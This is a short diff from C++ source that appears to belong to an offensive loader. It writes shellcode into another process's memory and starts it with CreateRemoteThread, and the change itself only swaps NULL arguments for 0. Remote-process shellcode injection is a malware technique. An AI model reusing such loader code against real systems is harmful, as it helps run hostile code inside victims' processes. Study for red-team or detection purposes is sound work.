@@ -41,7 +41,7 @@ namespace execute {
 
 		address_ptr = malapi::WriteShellcodeMemory(process_handle, shellcode, shellcode_size);
 
-		thread_handle = CreateRemoteThreadC(process_handle, NULL, NULL, (LPTHREAD_START_ROUTINE)address_ptr, NULL, NULL, NULL);
+		thread_handle = CreateRemoteThreadC(process_handle, 0, 0, (LPTHREAD_START_ROUTINE)address_ptr, NULL, NULL, NULL);
 		if (thread_handle == NULL)
 		{
 			LOG_ERROR("Error during CreateRemoteThread (Code: %08lX)", GetLastErrorC());
